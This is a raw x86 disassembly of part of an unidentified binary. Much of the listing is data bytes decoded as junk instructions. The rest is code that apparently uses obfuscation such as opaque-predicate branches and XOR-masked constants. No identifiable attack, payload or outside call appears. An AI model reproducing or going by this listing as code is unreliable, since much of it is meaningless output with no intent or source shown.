  429638:	outs   dx,BYTE PTR ds:[esi]
  429639:	js     0x429669
  42963b:	cmc    
  42963c:	ds idiv edi
  42963f:	sti    
  429640:	mov    esp,0x260d90dc
  429645:	loopne 0x42961c
  429647:	lahf   
  429648:	pop    esp
  429649:	jmp    0x105964f
  42964e:	add    BYTE PTR [eax],al
  429650:	jo     0x42968e
  429652:	push   ss
  429653:	inc    esi
  429654:	or     BYTE PTR [esi],cl
  429656:	test   DWORD PTR [edx+0x5e],ecx
  429659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42965a:	xor    esp,ebp
  42965c:	mov    bh,0x78
  42965e:	cli    
  42965f:	ret    0x9c95
  429662:	dec    esp
  429663:	fisub  WORD PTR [edi-0x2]
  429666:	pop    edx
  429667:	or     eax,DWORD PTR [ebx+0xb]
  42966a:	cli    
  42966b:	ins    DWORD PTR es:[edi],dx
  42966c:	je     0x42968a
  42966e:	push   ss
  42966f:	sub    esi,DWORD PTR [ebp+0x1f8569fb]
  429675:	xor    DWORD PTR [eax+edi*1+0x76aebad0],0x42
  42967d:	mov    esp,0x3a7328a
  429682:	xchg   al,ch
  429684:	pop    es
  429685:	push   edx
  429686:	jne    0x429643
  429688:	out    0xa2,al
  42968a:	das    
  42968b:	adc    bl,BYTE PTR [ecx+0x6b]
  42968e:	jmp    0xfb2d3b84
  429693:	or     DWORD PTR [ebp-0x2a],edi
  429696:	sbb    DWORD PTR [edi-0x14],edi
  429699:	imul   ebx,DWORD PTR [ebx+0x249abac4],0x41256739
  4296a3:	push   0x86141a0d
  4296a8:	add    al,0x55
  4296aa:	jge    0x4296aa
  4296ac:	mov    esp,0x8805b470
  4296b1:	mov    ds,esp
  4296b3:	je     0x42963f
  4296b5:	jae    0x429659
  4296b7:	cld    
  4296b8:	sbb    eax,0xad635b3b
  4296bd:	push   ds
  4296be:	dec    esp
  4296bf:	push   edi
  4296c0:	rcr    DWORD PTR [ebx+edi*4+0x78],cl
  4296c4:	sahf   
  4296c5:	mov    cl,0xfb
  4296c7:	fild   DWORD PTR [esi-0x3]
  4296ca:	call   0x1a9d6bd2
  4296cf:	xor    BYTE PTR [esp+esi*8+0x5b],dl
  4296d3:	ins    DWORD PTR es:[edi],dx
  4296d4:	(bad)  
  4296d5:	stc    
  4296d6:	ret    0xd1d0
  4296d9:	bound  edi,QWORD PTR [edi-0x17ec453f]
  4296df:	jbe    0x4296b2
  4296e1:	push   ebp
  4296e2:	and    BYTE PTR [ebp-0x15],dh
  4296e5:	push   esi
  4296e6:	in     al,dx
  4296e7:	xor    ebx,0xffffffe6
  4296ea:	(bad)  
  4296eb:	out    dx,al
  4296ec:	adc    edx,DWORD PTR ds:0x8d66a6bb
  4296f2:	dec    ebp
  4296f3:	(bad)  
  4296f4:	and    dh,bh
  4296f6:	adc    DWORD PTR [edx],0xffffff8f
  4296f9:	or     edi,DWORD PTR [esp+ebx*8-0x41]
  4296fd:	je     0x4296bf
  4296ff:	dec    ecx
  429700:	dec    ebp
  429701:	jns    0x42968a
  429703:	into   
  429704:	pop    ebx
  429705:	and    eax,0xe1d59dbd
  42970a:	xor    bl,BYTE PTR ds:0x879a260d
  429710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429711:	jmp    0xb52c:0x2444c7d0
  429718:	add    BYTE PTR gs:[eax],al
  42971b:	cmp    DWORD PTR ds:0x42f674,0x0
  429722:	ja     0x42973c
  429728:	sbb    DWORD PTR ds:0x42f600,edi
  42972e:	jmp    0x42973c
  429733:	push   DWORD PTR [ebp-0x1c]
  429736:	call   DWORD PTR ds:0x4387e8
  42973c:	mov    DWORD PTR [esp+0x20],0x4f0b
  429744:	mov    DWORD PTR [esp+0x24],0x14c4
  42974c:	jmp    0x42982c
  429751:	inc    edx
  429752:	mov    eax,ds:0xf7f7e496
  429757:	jb     0x429700
  429759:	xchg   edx,eax
  42975a:	repnz leave 
  42975c:	sbb    al,0x5b
  42975e:	xlat   BYTE PTR ds:[ebx]
  42975f:	dec    ebx
  429760:	addr16 pop ds
  429762:	jmp    0x0:0xc30001
  429769:	push   cs
  42976a:	mov    eax,ds:0xb8f75104
  42976f:	hlt    
  429770:	retf   
  429771:	mov    eax,ds:0x7a7dc593
  429776:	mov    ebp,DWORD PTR [edi]
  429778:	lds    ebx,FWORD PTR [ecx]
  42977a:	push   esp
  42977b:	bound  edi,QWORD PTR [edi]
  42977d:	out    dx,eax
  42977e:	ja     0x4297c0
  429780:	mov    esp,0x432df245
  429785:	inc    esi
  429786:	pusha  
  429787:	outs   dx,BYTE PTR ds:[esi]
  429788:	popa   
  429789:	fldenv [edi+ebx*1+0x55]
  42978d:	inc    ebp
  42978e:	ins    DWORD PTR es:[edi],dx
  42978f:	sbb    al,0x41
  429791:	ret    
  429792:	call   0x814d4df6
  429797:	and    DWORD PTR [ebp+0x1bd07b91],esi
  42979d:	xchg   esp,eax
  42979e:	sbb    al,0x35
  4297a0:	fdiv   DWORD PTR [eax-0x3e86d6e0]
  4297a6:	xchg   ebp,eax
  4297a7:	cmc    
  4297a8:	mov    bl,BYTE PTR [ebp+0x5b]
  4297ab:	or     al,0x2e
  4297ad:	push   ecx
  4297ae:	sbb    DWORD PTR [edi+ebx*8-0x4efa9f1],ebx
  4297b5:	add    BYTE PTR [esi+0x74],ch
  4297b8:	fs xchg esp,eax
  4297ba:	adc    BYTE PTR [edx],cl
  4297bc:	mov    DWORD PTR [edx-0x2b],esp
  4297bf:	pop    edx
  4297c0:	test   al,0xe3
  4297c2:	jae    0x42982f
  4297c4:	aam    0xd4
  4297c6:	fldcw  WORD PTR [ebx-0x6e]
  4297c9:	jns    0x429786
  4297cb:	loop   0x4297c2
  4297cd:	cdq    
  4297ce:	sti    
  4297cf:	pop    ebx
  4297d0:	je     0x4297a4
  4297d2:	(bad)  
  4297d3:	mov    eax,ds:0x1ce2cdcc
  4297d8:	clts   
  4297da:	icebp  
  4297db:	retf   
  4297dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4297dd:	mov    ss,WORD PTR [eax]
  4297df:	or     al,BYTE PTR [esi-0x63]
  4297e2:	dec    ecx
  4297e3:	adc    al,0xc6
  4297e5:	push   edx
  4297e6:	mov    edx,0x1635dfc2
  4297eb:	xor    dh,BYTE PTR [eax]
  4297ed:	test   eax,0xe9582b86
  4297f2:	out    dx,al
  4297f3:	xchg   esp,eax
  4297f4:	(bad)
  4297f7:	jge    0x4297cc
  4297f9:	sbb    DWORD PTR [ebx-0x5adc198b],edx
  4297ff:	xlat   BYTE PTR ds:[ebx]
  429800:	mov    ds:0xf811bb0c,al
  429805:	dec    eax
  429806:	sbb    esp,eax
  429808:	push   es
  429809:	fisttp DWORD PTR [eax+0x3d]
  42980c:	in     al,0x7e
  42980e:	sbb    eax,DWORD PTR [esi]
  429810:	cdq    
  429811:	mov    bh,0x8c
  429813:	aaa    
  429814:	xor    al,0xa1
  429816:	icebp  
  429817:	mov    edi,0x5108e1c
  42981c:	lods   eax,DWORD PTR ds:[esi]
  42981d:	sub    edi,DWORD PTR [ecx]
  42981f:	xor    esp,DWORD PTR [ebx+0x37]
  429822:	rol    BYTE PTR [ecx],1
  429824:	cld    
  429825:	outs   dx,BYTE PTR ds:[esi]
  429826:	repz cmp esp,DWORD PTR [edx-0x45]
  42982a:	push   esi
  42982b:	imul   eax,edi,0xa2182444
  429831:	add    al,BYTE PTR [eax]
  429833:	add    cl,ch
  429835:	fild   DWORD PTR [eax]
  429837:	add    BYTE PTR [eax],al
  429839:	aas    
  42983a:	in     eax,dx
  42983b:	sbb    edi,DWORD PTR [ebx-0x12400025]
  429841:	hlt    
  429842:	xor    al,0x20
  429844:	mov    eax,ds:0x3f8b4310
  429849:	loop   0x429835
  42984b:	add    DWORD PTR [eax],eax
  42984d:	ret    
  42984e:	add    BYTE PTR [eax],al
  429850:	add    BYTE PTR [ebx],al
  429852:	loope  0x429876
  429854:	sti    
  429855:	outs   dx,BYTE PTR ds:[esi]
  429856:	add    al,0xa3
  429858:	jno    0x4298c5
  42985a:	cmc    
  42985b:	iret   
  42985c:	adc    BYTE PTR [ebx+eiz*2+0x58dbaed1],0x7f
  429864:	sbb    ecx,DWORD PTR [ebp+0x34710467]
  42986a:	add    BYTE PTR [eax*1-0x240dae79],ch
  429871:	adc    BYTE PTR [edx+0x4c5cedfb],ah
  429877:	mov    al,ds:0x6a71235c
  42987c:	fnstcw WORD PTR [esi]
  42987e:	or     esp,DWORD PTR [ecx]
  429880:	stos   DWORD PTR es:[edi],eax
  429881:	and    eax,0xee6bdf9e
  429886:	and    eax,0xf8e30bc7
  42988b:	rcl    DWORD PTR [eax],1
  42988d:	in     eax,0xed
  42988f:	popa   
  429890:	xor    DWORD PTR [edi-0x5d],edi
  429893:	cmp    al,BYTE PTR [edx]
  429895:	fcomi  st,st(1)
  429897:	(bad)  
  429898:	mov    edx,0x43c00dac
  42989d:	mov    al,BYTE PTR ds:0x31e2228d
  4298a3:	fwait
  4298a4:	loop   0x42989a
  4298a6:	add    eax,DWORD PTR [eax+0x75c976e2]
  4298ac:	nop
  4298ad:	mov    ah,0x51
  4298af:	fmul   st(5),st
  4298b1:	pop    edi
  4298b2:	jecxz  0x42984d
  4298b4:	dec    eax
  4298b5:	ret    
  4298b6:	arpl   WORD PTR [ebx+0x4e184884],bp
  4298bc:	mov    BYTE PTR [eax+0x12],cl
  4298bf:	push   eax
  4298c0:	inc    eax
  4298c1:	popa   
  4298c2:	test   DWORD PTR [ecx-0x77],esi
  4298c5:	ja     0x4298e6
  4298c7:	sbb    BYTE PTR [ecx+0x4e9a56dd],ch
  4298cd:	aas    
  4298ce:	shr    dh,0x2f
  4298d1:	xchg   esi,eax
  4298d2:	inc    DWORD PTR [esi-0x6cc75cb3]
  4298d8:	(bad)  
  4298d9:	les    edx,FWORD PTR [esi+0x57cc91df]
  4298df:	adc    esp,ebp
  4298e1:	mov    ah,BYTE PTR [esi]
  4298e3:	loop   0x42990b
  4298e5:	aad    0x3a
  4298e7:	shl    DWORD PTR [ebx],0xf8
  4298ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4298eb:	xchg   esi,eax
  4298ec:	adc    BYTE PTR [edi+ecx*1],ch
  4298ef:	sub    al,0x36
  4298f1:	(bad)  
  4298f2:	loopne 0x4298a6
  4298f4:	push   edx
  4298f5:	daa    
  4298f6:	mov    cl,0x49
  4298f8:	sbb    DWORD PTR [edi-0x71],eax
  4298fb:	daa    
  4298fc:	xor    BYTE PTR [ebx+0x59c88297],bh
  429902:	mov    BYTE PTR [edx],al
  429904:	sbb    esp,0xa211ddd
  42990a:	sbb    al,0x33
  42990c:	pop    ss
  42990d:	mov    WORD PTR [edx],ss
  42990f:	or     bl,BYTE PTR [edx-0x38bfe05d]
  429915:	inc    esp
  429916:	and    al,0x1c
  429918:	scas   eax,DWORD PTR es:[edi]
  429919:	dec    edi
  42991a:	add    BYTE PTR [eax],al
  42991c:	mov    eax,DWORD PTR [esp+0x18]
  429920:	mov    ecx,DWORD PTR [esp+0x1c]
  429924:	cmp    DWORD PTR ds:0x42f5ec,0x0
  42992b:	jg     0x429a1f
  429931:	jmp    0x429a1f
  429936:	push   DWORD PTR [ebp-0x1c]
  429939:	call   DWORD PTR ds:0x4387ac
  42993f:	jmp    0x429a1f
  429944:	mov    bl,0xec
  429946:	push   eax
  429947:	ins    BYTE PTR es:[edi],dx
  429948:	pop    edi
  429949:	cld    
  42994a:	mov    edi,0xd58fbcff
  42994f:	or     eax,0xe460c846
  429954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429955:	jmp    0x429958
  429957:	add    bl,al
  429959:	add    BYTE PTR [eax],al
  42995b:	add    BYTE PTR [edx+edx*1+0x434b943b],ah
  429962:	loopne 0x42993e
  429964:	cmp    al,0xe6
  429966:	inc    edx
  429967:	jne    0x42995a
  429969:	push   edx
  42996a:	imul   eax,DWORD PTR [esi+ebp*8],0xffffffcc
  42996e:	cmp    DWORD PTR [edi],esi
  429970:	inc    esp
  429971:	cmp    al,0xc9
  429973:	mov    eax,0x26631427
  429978:	(bad)  
  429979:	pop    edi
  42997a:	pop    ds
  42997b:	cld    
  42997c:	or     cl,ch
  42997e:	sbb    DWORD PTR [ebx],esi
  429980:	xor    DWORD PTR [esi-0x63],edi
  429983:	or     BYTE PTR [edi+0x17d7a6c4],al
  429989:	xchg   edi,eax
  42998a:	shr    DWORD PTR [esi-0x86628fe],0xf7
  429991:	or     ebp,0xf7eb4f24
  429997:	push   eax
  429998:	and    BYTE PTR [edx-0x32],0x31
  42999c:	sbb    al,ah
  42999e:	push   edi
  42999f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4299a0:	enter  0xc251,0xeb
  4299a4:	or     DWORD PTR [edx+0x73],esi
  4299a7:	(bad)  
  4299a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4299a9:	in     al,dx
  4299aa:	sbb    BYTE PTR [ebx+0x667300e5],0x26
  4299b1:	ins    BYTE PTR es:[edi],dx
  4299b2:	(bad)  
  4299b3:	fdiv   QWORD PTR [edx-0x2f]
  4299b6:	and    BYTE PTR [edx+0x5e],0x5a
  4299ba:	js     0x429980
  4299bc:	cmp    BYTE PTR [ebx-0x29],0x6b
  4299c0:	push   0x6a
  4299c2:	push   eax
  4299c3:	or     esi,0x15538ed7
  4299c9:	ja     0x4299ee
  4299cb:	mov    ss,WORD PTR [esi-0x58c49e70]
  4299d1:	retf   
  4299d2:	ja     0x429a14
  4299d4:	mov    ebp,0x2397de9b
  4299d9:	cmp    ebp,DWORD PTR [edi+edi*2-0xe]
  4299dd:	sub    edx,DWORD PTR ds:0x3bc3142f
  4299e3:	push   ebp
  4299e4:	(bad)  
  4299e5:	fnstsw WORD PTR ds:0xafff7a9a
  4299eb:	xchg   DWORD PTR [esi-0x59],edx
  4299ee:	or     bh,BYTE PTR [edi-0x15]
  4299f1:	jmp    0xe77e601e
  4299f6:	rcr    ch,1
  4299f8:	ja     0x429a4f
  4299fa:	cmp    bh,cl
  4299fc:	push   cs
  4299fd:	mov    ebp,0x9a26b9db
  429a02:	dec    ecx
  429a03:	xor    ebx,DWORD PTR [ebx-0x5ad2f0d6]
  429a09:	test   eax,0xc2daf1b9
  429a0e:	push   ecx
  429a0f:	outs   dx,DWORD PTR ds:[esi]
  429a10:	mov    es,edi
  429a12:	mov    dl,0x28
  429a14:	call   0xedcb:0x50a04aa6
  429a1b:	add    ch,BYTE PTR [edx+ebx*4-0x37]
  429a1f:	mov    edx,DWORD PTR [esp+0x20]
  429a23:	mov    ebx,DWORD PTR [esp+0x24]
  429a27:	xor    ecx,0x35b0
  429a2d:	xor    eax,0x14c5
  429a32:	sub    eax,edx
  429a34:	mov    edx,DWORD PTR [esp+0x28]
  429a38:	sbb    ecx,ebx
  429a3a:	cmp    DWORD PTR ds:0x42f654,0x0
  429a41:	jge    0x429b37
  429a47:	jmp    0x429b37
  429a4c:	push   0x578b
  429a51:	call   DWORD PTR ds:0x4387b0
  429a57:	jmp    0x429b37
  429a5c:	sub    eax,0x2f212f20
  429a61:	das    
  429a62:	das    
  429a63:	sub    al,0x91
  429a65:	or     esp,ebx
  429a67:	lahf   
  429a68:	xor    BYTE PTR [esi+ebp*8-0x41],al
  429a6c:	push   0xc30001ec
  429a71:	add    BYTE PTR [eax],al
  429a73:	add    BYTE PTR [esi+0x32ce1225],dl
  429a79:	ds mov ecx,0x1d002a3f
  429a7f:	in     eax,dx
  429a80:	icebp  
  429a81:	dec    esi
  429a82:	cmp    ebx,DWORD PTR [ecx]
  429a84:	sub    al,0x88
  429a86:	aam    0xf9
  429a88:	leave  
  429a89:	pop    ecx
  429a8a:	or     cl,BYTE PTR [edi+0x2f]
  429a8d:	jno    0x429a63
  429a8f:	outs   dx,BYTE PTR ds:[esi]
  429a90:	jge    0x429a4d
  429a92:	jnp    0x429a4f
  429a94:	xlat   BYTE PTR ds:[ebx]
  429a95:	jp     0x429a41
  429a97:	cmp    BYTE PTR [esi+0x4],bh
  429a9a:	outs   dx,BYTE PTR ds:[esi]
  429a9b:	sbb    dh,BYTE PTR [ecx]
  429a9d:	cmp    cl,BYTE PTR [ebx]
  429a9f:	xor    al,0x35
  429aa1:	push   ss
  429aa2:	cli    
  429aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429aa4:	dec    esp
  429aa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429aa6:	out    0x0,eax
  429aa8:	loop   0x429a4c
  429aaa:	dec    eax
  429aab:	sub    DWORD PTR [edi-0x28952f35],ebp
  429ab1:	data16 jns 0x429a79
  429ab4:	adc    DWORD PTR [eax],ebp
  429ab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ab7:	or     dl,BYTE PTR [ebp-0x3e28e079]
  429abd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429abe:	push   ebx
  429abf:	inc    ebp
  429ac0:	stos   BYTE PTR es:[edi],al
  429ac1:	les    esp,FWORD PTR [eax+0x1b]
  429ac4:	pop    esi
  429ac5:	mul    dh
  429ac7:	adc    ebx,DWORD PTR [ecx-0x18603719]
  429acd:	repz scas eax,DWORD PTR es:[edi]
  429acf:	les    ebx,FWORD PTR [eax+0x775fc12a]
  429ad5:	add    eax,0x7bfb68f2
  429ada:	sub    BYTE PTR [edx],ah
  429adc:	ds mov edx,0x9305c6f2
  429ae2:	fst    DWORD PTR [eax+ebp*8+0x34]
  429ae6:	loop   0x429ae4
  429ae8:	push   edx
  429ae9:	pop    esp
  429aea:	lods   eax,DWORD PTR ds:[esi]
  429aeb:	lods   eax,DWORD PTR ds:[esi]
  429aec:	xchg   esi,eax
  429aed:	fild   QWORD PTR [ebp+0x31]
  429af0:	lahf   
  429af1:	pop    ecx
  429af2:	pop    ds
  429af3:	ins    DWORD PTR es:[edi],dx
  429af4:	adc    BYTE PTR [edi-0x41],cl
  429af7:	mov    eax,0x4ce49416
  429afc:	jns    0x429b25
  429afe:	(bad)  
  429b00:	add    al,0xbf
  429b02:	cwde   
  429b03:	jg     0x429a85
  429b05:	arpl   WORD PTR [ecx+0x15],cx
  429b08:	outs   dx,DWORD PTR gs:[esi]
  429b0a:	cld    
  429b0b:	cmp    BYTE PTR [ebp-0x72],0x17
  429b0f:	inc    esp
  429b10:	pop    esp
  429b11:	nop
  429b12:	popf   
  429b13:	jne    0x429b8a
  429b15:	inc    ecx
  429b16:	mov    al,BYTE PTR [esi+0x2a]
  429b19:	jmp    0x429af8
  429b1b:	(bad)  
  429b1c:	push   ebx
  429b1d:	pop    edx
  429b1e:	add    al,0x98
  429b20:	aas    
  429b21:	add    DWORD PTR [ebx],edi
  429b23:	sbb    ecx,ecx
  429b25:	ret    0x7283
  429b28:	mov    ds:0x74a5e1ac,eax
  429b2d:	sbb    esp,esp
  429b2f:	les    edi,FWORD PTR [eax+ebp*2]
  429b32:	mov    ds:0x72e05599,eax
  429b37:	mov    ebx,DWORD PTR [esp+0x2c]
  429b3b:	jmp    0x429c1b
  429b40:	push   ebp
  429b41:	into   
  429b42:	or     al,0x7f
  429b44:	lahf   
  429b45:	push   DWORD PTR [edi-0x12]
  429b48:	addr16 iretw 
  429b4b:	mov    eax,ds:0x95fa117b
  429b50:	sub    ebp,ebp
  429b52:	add    DWORD PTR [eax],eax
  429b54:	ret    
  429b55:	add    BYTE PTR [eax],al
  429b57:	add    BYTE PTR [eax-0x59cf3dda],dl
  429b5d:	cs test al,0x19
  429b60:	xchg   ebx,eax
  429b61:	mov    ch,0x42
  429b63:	dec    eax
  429b64:	mov    esi,esi
  429b66:	mov    WORD PTR [edi+0x7b],cs
  429b69:	mov    edi,0x3de3d958
  429b6e:	dec    ebx
  429b6f:	cwde   
  429b70:	shl    BYTE PTR [ebx],0x57
  429b73:	adc    BYTE PTR [ebx-0x58ed23c0],0x27
  429b7a:	clc    
  429b7b:	js     0x429bbd
  429b7d:	push   ebx
  429b7e:	add    eax,DWORD PTR [edi+0x1c]
  429b81:	push   ecx
  429b82:	dec    edi
  429b83:	fwait
  429b84:	xchg   edi,eax
  429b85:	xchg   ebx,eax
  429b86:	sub    edx,eax
  429b88:	mov    ebp,DWORD PTR [ebx+0x26]
  429b8b:	dec    edi
  429b8c:	inc    ebp
  429b8d:	xchg   esp,eax
  429b8e:	pop    ebp
  429b8f:	inc    esp
  429b90:	data16 xchg BYTE PTR es:[ebp-0x271f190],ch
  429b98:	push   ecx
  429b99:	scas   al,BYTE PTR es:[edi]
  429b9a:	pop    edi
  429b9b:	sbb    al,0xf
  429b9d:	mov    eax,ds:0x47d63836
  429ba2:	mov    ds:0x341dea72,al
  429ba7:	jl     0x429b91
  429ba9:	adc    dl,al
  429bab:	es cld 
  429bad:	xchg   DWORD PTR [ebx],edi
  429baf:	jp     0x429ba4
  429bb1:	or     bl,BYTE PTR [eax]
  429bb3:	dec    eax
  429bb4:	(bad)  
  429bb5:	push   eax
  429bb6:	mov    bh,BYTE PTR [esi+0x70]
  429bb9:	aas    
  429bba:	push   cs
  429bbb:	jmp    0xaf618a8
  429bc0:	sub    BYTE PTR [eax-0x20],bl
  429bc3:	jmp    0x566e:0x9736b1b2
  429bca:	jge    0x429b87
  429bcc:	sbb    dl,0x80
  429bcf:	sbb    ecx,DWORD PTR [ecx]
  429bd1:	pop    es
  429bd2:	retf   
  429bd3:	or     al,0x22
  429bd5:	loop   0x429bc9
  429bd7:	aas    
  429bd8:	mov    edi,0xdcdf3379
  429bdd:	icebp  
  429bde:	pop    ss
  429bdf:	mov    DWORD PTR [ebp+esi*8+0x2ad62788],0x466ff848
  429bea:	inc    esp
  429beb:	xor    dl,BYTE PTR [eax+eax*8-0x2c69e97]
  429bf2:	push   esp
  429bf3:	adc    DWORD PTR [esi],edx
  429bf5:	rol    BYTE PTR [edi],cl
  429bf7:	xchg   BYTE PTR [esi-0x5f],ch
  429bfa:	dec    ebp
  429bfb:	pop    eax
  429bfc:	iret   
  429bfd:	js     0x429c61
  429bff:	mov    al,0xb1
  429c01:	push   edx
  429c02:	mov    al,ds:0xcc8071b2
  429c07:	repz jle 0x429c1b
  429c0a:	scas   eax,DWORD PTR es:[edi]
  429c0b:	and    esp,edx
  429c0d:	sbb    dh,al
  429c0f:	lock leave 
  429c11:	frstor [eax+eax*1-0x5640cbe8]
  429c18:	mov    edx,0xc22b2679
  429c1d:	mov    edx,DWORD PTR [esp+0x30]
  429c21:	sbb    ecx,ebx
  429c23:	mov    ebx,DWORD PTR [esp+0x34]
  429c27:	jmp    0x429cd8
  429c2c:	inc    ecx
  429c2d:	leave  
  429c2e:	push   eax
  429c2f:	rcr    al,0xd9
  429c32:	ror    ecx,1
  429c34:	sbb    dl,BYTE PTR [esi-0x65]
  429c37:	jo     0x429c03
  429c39:	mov    dl,0xde
  429c3b:	add    ch,dh
  429c3d:	in     eax,dx
  429c3e:	add    DWORD PTR [eax],eax
  429c40:	xchg   esp,eax
  429c41:	add    BYTE PTR [eax],al
  429c43:	add    cl,bl
  429c45:	jb     0x429c41
  429c47:	mov    ebp,0x633d5f32
  429c4c:	or     dh,BYTE PTR [esi+0x7f]
  429c4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429c50:	sbb    al,0xdf
  429c52:	fdivr  DWORD PTR [ebx+0x770a907e]
  429c58:	adc    al,0xb6
  429c5a:	sbb    edi,DWORD PTR [ebx-0x51696421]
  429c60:	cmp    al,BYTE PTR [ecx-0x26]
  429c63:	xor    DWORD PTR [esi],esp
  429c65:	xor    al,0x85
  429c67:	push   0x16
  429c69:	pop    eax
  429c6a:	fisub  DWORD PTR [ebp-0x23dd36f0]
  429c70:	mov    eax,ds:0x65d740a6
  429c75:	sub    BYTE PTR ds:[edi],0x11
  429c79:	and    esp,ecx
  429c7b:	hlt    
  429c7c:	sbb    eax,0x9f9b52a
  429c81:	outs   dx,DWORD PTR ds:[esi]
  429c82:	imul   esi,DWORD PTR [ebx-0x41],0xffffff8b
  429c86:	and    esi,DWORD PTR [edx-0x6779b67b]
  429c8c:	cdq    
  429c8d:	xchg   DWORD PTR [ebp-0x4120f86f],esi
  429c93:	xor    DWORD PTR [ebx+0x26d6241d],edx
  429c99:	adc    BYTE PTR [edx-0x4de2ba28],dl
  429c9f:	fcmovnb st,st(0)
  429ca1:	mov    ecx,ecx
  429ca3:	mov    WORD PTR [eax-0x12dfe50c],?
  429ca9:	jo     0x429cc8
  429cab:	packsswb mm5,QWORD PTR [ebp+0x1a]
  429caf:	in     eax,0xdd
  429cb1:	dec    esp
  429cb2:	jo     0x429c55
  429cb4:	(bad)  
  429cb5:	mov    ebx,0x1087d6bb
  429cba:	cmp    dh,ah
  429cbc:	clc    
  429cbd:	cmp    DWORD PTR [edx-0xd6deb35],0xffffffc8
  429cc4:	jmp    0x638:0xf236c980
  429ccb:	icebp  
  429ccc:	jmp    0xc2b2c8db
  429cd1:	sub    al,0xcd
  429cd3:	mov    ds:0x25872ad,eax
  429cd8:	add    eax,0xffffff83
  429cdb:	adc    ecx,0xfffff0d6
  429ce1:	mov    DWORD PTR ds:0x42f620,0x486
  429ceb:	cmp    eax,edx
  429ced:	mov    DWORD PTR ds:0x42f60c,0x2b16
  429cf7:	jne    0x429d05
  429cfd:	cmp    ecx,ebx
  429cff:	je     0x42a013
  429d05:	mov    eax,DWORD PTR [esp+0x44]
  429d09:	xor    edx,edx
  429d0b:	add    eax,edi
  429d0d:	mov    ecx,0xffff7223
  429d12:	adc    edx,ecx
  429d14:	mov    ebx,0xacff
  429d19:	xor    edx,ebx
  429d1b:	mov    DWORD PTR [esp+0x24],edx
  429d1f:	mov    edx,DWORD PTR [esp+0x10]
  429d23:	mov    DWORD PTR [esp+0x18],edx
  429d27:	mov    edx,DWORD PTR [esp+0x14]
  429d2b:	xor    eax,esi
  429d2d:	mov    DWORD PTR [esp+0x1c],edx
  429d31:	cmp    eax,DWORD PTR [esp+0x18]
  429d35:	jne    0x429d47
  429d3b:	mov    eax,edx
  429d3d:	cmp    DWORD PTR [esp+0x24],eax
  429d41:	je     0x429f83
  429d47:	mov    eax,DWORD PTR [esp+0x64]
  429d4b:	mov    edx,DWORD PTR [esp+0x64]
  429d4f:	sub    eax,0x7511
  429d54:	sub    edx,0x3cf87511
  429d5a:	xor    eax,0x59c9
  429d5f:	xor    edx,0x78e20000
  429d65:	shr    edx,0x10
  429d68:	shl    eax,0x10
  429d6b:	or     eax,edx
  429d6d:	add    eax,0xc3078aef
  429d72:	xor    edx,edx
  429d74:	add    eax,edi
  429d76:	adc    edx,ecx
  429d78:	xor    eax,esi
  429d7a:	xor    edx,ebx
  429d7c:	cmp    eax,0xebeb4fd4
  429d81:	jne    0x429d93
  429d87:	cmp    edx,0xffffdedc
  429d8d:	je     0x429dca
  429d93:	mov    eax,DWORD PTR [esp+0x70]
  429d97:	cdq    
  429d98:	add    eax,edi
  429d9a:	adc    edx,ecx
  429d9c:	xor    edx,ebx
  429d9e:	mov    DWORD PTR [esp+0x24],edx
  429da2:	mov    edx,DWORD PTR [esp+0x10]
  429da6:	mov    DWORD PTR [esp+0x18],edx
  429daa:	mov    edx,DWORD PTR [esp+0x14]
  429dae:	xor    eax,esi
  429db0:	mov    DWORD PTR [esp+0x1c],edx
  429db4:	cmp    DWORD PTR [esp+0x18],eax
  429db8:	jne    0x429f83
  429dbe:	mov    eax,DWORD PTR [esp+0x24]
  429dc2:	cmp    edx,eax
  429dc4:	jne    0x429f83
  429dca:	mov    DWORD PTR [esp+0x54],0x42f240
  429dd2:	mov    DWORD PTR [esp+0x48],0x42f238
  429dda:	mov    eax,DWORD PTR [esp+0x84]
  429de1:	xor    edx,edx
  429de3:	add    eax,edi
  429de5:	adc    ecx,edx
  429de7:	mov    edx,DWORD PTR [esp+0x10]
  429deb:	mov    DWORD PTR [esp+0x18],edx
  429def:	mov    edx,DWORD PTR [esp+0x14]
  429df3:	xor    eax,esi
  429df5:	xor    ecx,ebx
  429df7:	mov    DWORD PTR [esp+0x1c],edx
  429dfb:	cmp    DWORD PTR [esp+0x18],eax
  429dff:	jne    0x429e98
  429e05:	cmp    edx,ecx
  429e07:	jne    0x429e98
  429e0d:	mov    DWORD PTR [esp+0x18],0x42f1c8
  429e15:	mov    eax,DWORD PTR [esp+0x10]
  429e19:	mov    ecx,DWORD PTR [esp+0x14]
  429e1d:	mov    ecx,DWORD PTR [esp+0x18]
  429e21:	mov    ecx,DWORD PTR [ecx+0xc]
  429e24:	xor    eax,esi
  429e26:	add    eax,0x99b8624d
  429e2b:	cmp    eax,DWORD PTR [ecx]
  429e2d:	jne    0x429e59
  429e33:	mov    eax,DWORD PTR [esp+0x10]
  429e37:	mov    ecx,DWORD PTR [esp+0x14]
  429e3b:	xor    eax,esi
  429e3d:	sub    eax,edi
  429e3f:	push   eax
  429e40:	push   0xffffdedc
  429e45:	push   0xebeb4fd7
  429e4a:	lea    eax,[esp+0x64]
  429e4e:	push   eax
  429e4f:	lea    eax,[esp+0x20]
  429e53:	push   eax
  429e54:	call   0x41c901
  429e59:	push   DWORD PTR [esp+0x5c]
  429e5d:	push   DWORD PTR [esp+0x5c]
  429e61:	push   DWORD PTR [esp+0x1c]
  429e65:	push   DWORD PTR [esp+0x1c]
  429e69:	call   0x41e3f1
  429e6e:	mov    eax,DWORD PTR [esp+0x10]
  429e72:	mov    ecx,DWORD PTR [esp+0x14]
  429e76:	mov    ecx,DWORD PTR [esp+0x54]
  429e7a:	xor    eax,esi
  429e7c:	add    eax,0x99b8624d
  429e81:	mov    DWORD PTR [ecx],eax
  429e83:	mov    eax,DWORD PTR [esp+0x10]
  429e87:	mov    ecx,DWORD PTR [esp+0x14]
